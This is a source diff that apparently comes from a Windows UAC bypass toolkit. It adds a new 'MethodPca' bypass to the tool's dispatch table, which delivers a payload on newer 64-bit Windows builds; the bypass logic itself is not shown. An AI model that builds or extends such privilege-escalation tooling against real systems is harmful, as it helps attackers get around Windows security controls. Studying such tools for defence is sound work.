@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.55
+*  VERSION:     3.56
 *
-*  DATE:        02 Mar 2021
+*  DATE:        16 July 2021
 *
 *  UAC bypass dispatch.
 *
@@ -44,6 +44,7 @@ UCM_API(MethodIeAddOnInstall);
 UCM_API(MethodWscActionProtocol);
 UCM_API(MethodFwCplLua2);
 UCM_API(MethodProtocolHijack);
+UCM_API(MethodPca);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -53,7 +54,8 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWscActionProtocol,
     UacMethodFwCplLua2,
     UacMethodMsSettingsProtocol,
-    UacMethodMsStoreProtocol
+    UacMethodMsStoreProtocol,
+    UacMethodPca
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -125,7 +127,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodWscActionProtocol, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodFwCplLua2, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodProtocolHijack, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodProtocolHijack, { 17763, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
+    { MethodProtocolHijack, { 17763, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodPca, { 17763, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -721,4 +724,16 @@ UCM_API(MethodProtocolHijack)
     }
 
     return Result;
+}
+
+UCM_API(MethodPca)
+{
+#ifndef _WIN64
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+#else
+    return ucmPcaMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+#endif
 }
